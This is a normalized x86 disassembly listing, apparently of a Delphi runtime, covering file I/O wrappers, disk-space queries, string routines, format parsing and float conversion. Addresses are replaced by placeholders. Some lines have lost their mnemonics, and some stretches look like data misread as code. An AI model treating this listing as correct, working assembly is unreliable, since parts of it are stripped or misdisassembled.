xor edx edx
lea eax [ ebp + 0x8 ]
call sub_408428
mov edx esi
pop eax
call sub_404094
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_40851c
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_4083bc
mov edx esi
pop eax
call sub_404094
add esp 0x20
pop esi
retn
xor edx edx
sub_408544
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c88
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_408010
sub_408598
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c88
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_4085b8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404e1c
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_4085d8
mov eax [ rw-data ]
call sub_40504c
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_40504c
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405208
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403ff8
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405208
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403ff8
sub_408668
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_4082d0
test al al
je r-xdata
sub_4086a4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409a84
mov edx eax
test dl dl
je r-xdata
call sub_4085d8
push ebp
mov eax [ rw-data ]
call sub_405054
mov edx eax
mov eax [ rw-data ]
call sub_408668
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_405054
mov edx eax
mov eax [ rw-data ]
call sub_408668
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_408740
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403ff8
call sub_4085d8
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403ff8
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403ff8
jmp r-xdata
pop esi
pop ebx
retn
sub_408790
push cs
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
sete al
add esp 0x400
pop esi
pop ebx
retn
popad
je r-xdata
inc eax
add al ch
cmp al cl
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add al 0x11
inc eax
add [ eax + eax ] al
add [ eax ] al
mov eax eax
push ebx
push esi
add esp 0xfffffc00
mov esi eax
mov ebx edx
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
call LoadStringA
mov ecx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_404094
cmp [ ebx + 0x4 ] 0x0
sub_4087e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40493c
xor eax eax
push ebp
push sub_40884e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x4 ]
call sub_403fa4
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405868
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ff8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_408855
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404a0c
retn
sub_408870
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_404464
push eax
call CreateFileA
sub_4088c8
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_404464
push eax
call CreateFileA
pop ebx
retn
sub_4088f4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408920
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_40894c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40898c
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_404464
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_408a04
push ebx
push esi
mov esi eax
mov eax esi
call sub_404264
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c624
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408a34
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_404264
mov edi eax
mov eax ebx
call sub_404464
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408d64
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c624
cmp al 0x2
jne r-xdata
dec edi
sub_408a84
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408a34
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_4044c4
pop edi
pop esi
pop ebx
retn
sub_408abc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_408a34
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_403fa4
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_4044c4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_408b04
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_404464
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_404094
add esp 0x108
pop esi
pop ebx
retn
sub_408b40
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404df8
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404df8
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408bf0
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408c18
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ edi - 0x1 ]
pop esi
pop edi
retn
sub_408c44
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408c78
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404264
push eax
mov eax ebx
call sub_404464
mov edx eax
mov eax esi
pop ecx
call sub_408c44
pop esi
pop ebx
retn
sub_408c9c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_404464
mov edx eax
mov ecx edi
mov eax ebx
call sub_408c44
pop edi
pop esi
pop ebx
retn
sub_408cbc
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408ce0
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408d20
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408d78
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408e00
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408bb4
mov esi eax
inc esi
mov eax esi
call sub_408de0
mov ecx esi
mov edx ebx
call sub_408be0
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408e3c
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c648
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408be0
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_408010
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408ec4
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_40921b
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408fa6
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408fee
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408fa6
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408eb8
pop edx
or edx edx
je r-xdata
sub_408fa6
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_40921b
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408fee
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_40921b
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408e3c
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_409015 ]
mov ebx ecx
sub cl 0x44
je sub_408428
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_4041cc
jmp r-xdata
mov esi sub_40422c
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_408428
sub cl 0x44
je sub_4083bc
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_4083bc
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408428
mov ecx 0x10
cmp bl 0x58
je sub_4083bc
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408e94
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_4093d4
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_4083bc
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_40923c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408bb4
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408ec4
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_40927c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408bb4
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408ec4
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4092d0
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_404264
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404264
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_404264
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408ec4
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_404094
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403fa4
mov eax esi
mov edx ebx
call sub_4045f0
mov eax [ ebp - 0x4 ]
call sub_404264
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408ec4
mov edx esi
xchg edx eax
call sub_4045f0
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_409390
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_4093d4
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_4096a8
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_4094d3
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_4094dd
call sub_4094d3
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_409390
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_409539
call sub_4094d3
call sub_4094ca
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_4094ca
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_409390
retn
xor ecx ecx
sub_409575
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_4094ca
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_4094ca
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_4095da
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_40962e
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_409575
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_4096a8
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_4096d5
jmp r-xdata
call sub_4097f7
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_4096d5
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402da8
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
